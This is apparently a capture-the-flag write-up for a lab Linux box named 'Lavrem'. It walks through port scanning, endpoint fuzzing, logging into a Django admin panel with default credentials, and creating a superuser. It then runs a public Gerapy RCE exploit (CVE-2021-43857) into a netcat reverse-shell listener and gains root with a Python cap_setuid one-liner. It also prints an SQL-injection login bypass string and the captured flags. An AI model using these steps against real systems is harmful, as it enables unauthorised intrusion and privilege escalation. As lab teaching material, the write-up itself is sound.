---
title: "Lavrem - Writeup"
linkTitle: "Lavrem"
weight: 1
featured: true
platform: "PG"
name: "Lavrem"
os: "Linux"
difficulty: "Easy"
release: "27 Jun 2026"
ip: "192.168.171.24"
# Drop a real avatar at static/img/pg/lavrem.png and uncomment:
# avatar: "/img/pg/lavrem.png"
tags: ["linux", "web", "django", "gerapy", "cve-2021-43857", "suid", "capabilities"]
description: "Easy Linux box. A misconfigured Gerapy crawler manager, a hidden Django admin panel with default creds, and a SUID Python binary for root."
---

{{< htb name="Lavrem" os="Linux" difficulty="Easy" release="27 Jun 2026" ip="192.168.171.24" platform="PG" >}}

## Reconnaissance

Start with a quick default scan by nmap.

```
(root㉿kali)# nmap 192.168.171.24
```

Only two ports open, SSH and a web service on an unusual port.

```
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

```
(root㉿kali)# nmap 192.168.171.24 -p 22,8000 -sCV
```

The service scan identifies the web app by name, **Gerapy**, running under Django's development WSGIServer on Python 3.10.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-title: Gerapy
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
```

## Enumeration

Gerapy login page. Default credentials (`admin:admin`) and a basic SQLi bypass attempt (`admin'+OR+'1'='1#`) both fail here.

![Gerapy frontend login rejecting default creds](/img/pg/lavrem/01-gerapy-login.png)

Fuzzing to find other endpoints.

```
(root㉿kali)# ffuf -u "http://192.168.171.24:8000/FUZZ" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c
```

```
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 102ms]
```

That `/admin` path is actually Django's built-in admin panel, separate from Gerapy's frontend, and `admin:admin` logs right in.


![Django admin login accepting default credentials](/img/pg/lavrem/02-django-admin-login.png)

## Initial Foothold

Inside the Django admin panel, **Authentication and Authorization → Users** is directly accessible.

![Django admin dashboard with the Users section highlighted](/img/pg/lavrem/03-django-admin-panel.png)

Rather than hunting for an exploit, the fastest route is using the panel's own features, create a new user, then check the **Superuser status** box.

```
Username: admin2
Password: complex_pass123
```

![Adding a new admin2 user via the Django admin panel](/img/pg/lavrem/04-add-user.png)

![Ticking the Superuser status checkbox to grant full privileges](/img/pg/lavrem/05-superuser-status.png)

With superuser access secured, the next question becomes whether Gerapy itself has a known vulnerability to exploit.

```
(root㉿kali)# searchsploit gerapy
```

```
Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated) | python/remote/50640.py
```

```
(root㉿kali)# searchsploit -m 50640.py
```

The exploit is CVE-2021-43857, an authenticated RCE affecting Gerapy versions before 0.9.8. It just needs valid credentials, which is exactly what the superuser account provides. Edit the script to use the new account.

```python
login = "admin2"
password = "complex_pass123"
```

Set up a listener and run the exploit.

```
(root㉿kali)# rlwrap nc -lvnp 443
```

```
connect to [192.168.45.186] from (UNKNOWN) [192.168.171.24] 54972
bash: no job control in this shell
```

A shell lands as `app`. Grab the user flag from the home directory.

```
app@ubuntu$ cd
app@ubuntu$ cat local.txt
```

```
279ea****************************
```

## Privilege Escalation

Checking capabilities.

```
app@ubuntu$ getcap -r / 2>/dev/null
```

```
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```

`/usr/bin/python3.10` carries `cap_setuid=ep`, the binary can call `setuid()` and change its effective UID directly, no SUID bit or sudo entry required. [GTFOBins' Python entry](https://gtfobins.github.io/gtfobins/python/#capabilities) documents exactly this as a direct root path.

```
app@ubuntu$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```
whoami
root
```

Root shell confirmed. Grab the proof flag.

```
root@ubuntu# cd /root
root@ubuntu# cat proof.txt
```

```
3a8f5f3ba8c7cb18b105152397dca6dc
```

## Lessons learned

- Fuzz even after a login form rejects creds. Django's `/admin` was a completely separate, unprotected surface right next to a hardened custom login.
- Built-in admin panels with "add user" features are free privesc. No CVE needed to go from any logged-in account to superuser.
- Run `getcap -r /` alongside every SUID check, not after. This box's entire path to root was invisible to `find / -perm -4000` alone.
